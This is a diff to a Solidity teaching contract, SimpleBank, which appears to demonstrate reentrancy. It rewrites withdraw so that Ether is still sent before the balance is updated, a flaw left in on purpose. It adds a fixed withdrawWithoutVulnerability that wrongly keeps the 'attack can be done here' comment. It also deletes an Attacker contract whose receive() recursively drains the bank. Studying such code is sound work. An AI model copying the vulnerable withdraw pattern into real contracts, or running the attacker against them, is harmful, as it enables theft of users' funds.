@@ -10,15 +10,32 @@ contract SimpleBank {
         userBalance[msg.sender] += msg.value;
     }
 
-    function withdraw() public {
+    function withdraw(uint256 amount_) public {
         //Reentrancy attack can be done here
-        require(userBalance[msg.sender] >= 1 ether, "User has not enough balance");
-        require(address(this).balance > 0, "Ban is rekt");
+        require(amount_ >= 1 ether, "Min amount 1 ether");
+        require(address(this).balance >= amount_);
 
-        (bool success,) = msg.sender.call{value: userBalance[msg.sender]}("");
+        uint256 userBalance_ = userBalance[msg.sender];
+        require(userBalance_ >= amount_, "User has not enough balance");
+
+        (bool success,) = msg.sender.call{value: amount_}("");
         require(success, "fail");
 
-        userBalance[msg.sender] = 0;
+        userBalance[msg.sender] = userBalance_ - amount_;
+    }
+
+    function withdrawWithoutVulnerability(uint256 amount_) public {
+        //Reentrancy attack can be done here
+        require(amount_ >= 1 ether, "Min amount 1 ether");
+        require(address(this).balance >= amount_);
+
+        uint256 userBalance_ = userBalance[msg.sender];
+        require(userBalance_ >= amount_, "User has not enough balance");
+
+        userBalance[msg.sender] = userBalance_ - amount_;
+
+        (bool success,) = msg.sender.call{value: amount_}("");
+        require(success, "Failure");
     }
 
     function totalBalance() public view returns (uint256) {
@@ -26,21 +43,3 @@ contract SimpleBank {
     }
 }
 
-contract Attacker {
-    SimpleBank simpleBank;
-
-    constructor(address _simpleBankAddress) {
-        simpleBank = SimpleBank(_simpleBankAddress);
-    }
-
-    function attack() external payable {
-        simpleBank.deposit{value: msg.value}();
-        simpleBank.withdraw();
-    }
-
-    receive() external payable {
-        if (address(simpleBank).balance >= 1 ether) {
-            simpleBank.withdraw();
-        }
-    }
-}
